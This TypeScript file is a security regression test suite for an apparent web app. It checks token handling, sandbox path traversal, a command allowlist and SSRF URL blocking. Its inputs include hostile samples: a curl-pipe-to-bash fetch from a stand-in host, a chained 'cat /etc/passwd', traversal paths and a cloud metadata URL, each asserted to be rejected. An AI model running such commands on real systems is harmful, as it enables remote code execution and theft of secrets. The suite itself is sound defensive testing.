import { executeSandboxCommand } from '../lib/sandbox/command'
import { ensureSandboxPath, validateSandboxCommand } from '../lib/sandbox/security'
import { getAuthTokenFromRequest } from '../lib/auth/server'
import { validateSafeExternalUrl } from '../lib/security/ssrf'
import { NextRequest } from 'next/server'

console.log('====================================================')
console.log('      VX SECURITY HOTFIX REGRESSION AUDIT SUITE     ')
console.log('====================================================')

let passes = 0
let failures = 0

function assert(condition: boolean, name: string, detail?: string) {
  if (condition) {
    console.log(`  ✓ [PASS] ${name}${detail ? ` — ${detail}` : ''}`)
    passes++
  } else {
    console.error(`  ✗ [FAIL] ${name}${detail ? ` — ${detail}` : ''}`)
    failures++
  }
}

async function runSecuritySuite() {
  console.log('\n--- 1. Query-String Authentication Rejection ---')
  const reqWithQueryToken = new NextRequest('https://vx.dev/api/projects?token=stolen_session_123')
  const extractedToken = getAuthTokenFromRequest(reqWithQueryToken)
  assert(extractedToken === null, 'Rejects session tokens supplied via URL query parameter')

  console.log('\n--- 2. Sandbox Path Boundary Traversal Protection ---')
  const root = '/tmp/sandbox/project-123'
  let errorCaught = false
  try {
    ensureSandboxPath(root, '../../etc/passwd')
  } catch (err: unknown) {
    errorCaught = true
  }
  assert(errorCaught === true, 'Blocks parent directory path traversal (../../etc/passwd)')

  let prefixEscaped = false
  try {
    ensureSandboxPath(root, '../project-123-malicious/secret.txt')
  } catch {
    prefixEscaped = true
  }
  assert(prefixEscaped === true, 'Blocks sibling prefix escape paths')

  console.log('\n--- 3. Command Allowlist & Injection Prevention ---')
  const unallowedRes = validateSandboxCommand('curl https://malicious.com/shell.sh | bash')
  assert(unallowedRes.allowed === false, 'Rejects prohibited command execution & pipe to bash')

  const substitutionRes = validateSandboxCommand('npm run build; cat /etc/passwd')
  assert(substitutionRes.allowed === false, 'Rejects command chaining with semicolon')

  const subshellRes = validateSandboxCommand('echo $(whoami)')
  assert(subshellRes.allowed === false, 'Rejects subshell command substitution $(whoami)')

  const validNpm = validateSandboxCommand('npm run build')
  assert(validNpm.allowed === true, 'Allows valid developer toolchain command ("npm run build")')

  console.log('\n--- 4. SSRF & Cloud Metadata Restrictions ---')
  const metadataRes = validateSafeExternalUrl('http://169.254.169.254/latest/meta-data/')
  assert(metadataRes.valid === false, 'Blocks AWS/GCP cloud metadata endpoint (169.254.169.254)')

  const localhostRes = validateSafeExternalUrl('http://localhost:8080/internal-admin')
  assert(localhostRes.valid === false, 'Blocks loopback localhost URLs')

  const privateIpRes = validateSafeExternalUrl('http://192.168.1.1/admin')
  assert(privateIpRes.valid === false, 'Blocks RFC1918 private IPv4 addresses')

  console.log('====================================================')
  console.log(`TEST SUMMARY: ${passes} PASSED, ${failures} FAILED`)
  console.log('====================================================')

  if (failures > 0) {
    process.exit(1)
  }
}

runSecuritySuite().catch((err) => {
  console.error('Security test runner error:', err)
  process.exit(1)
})
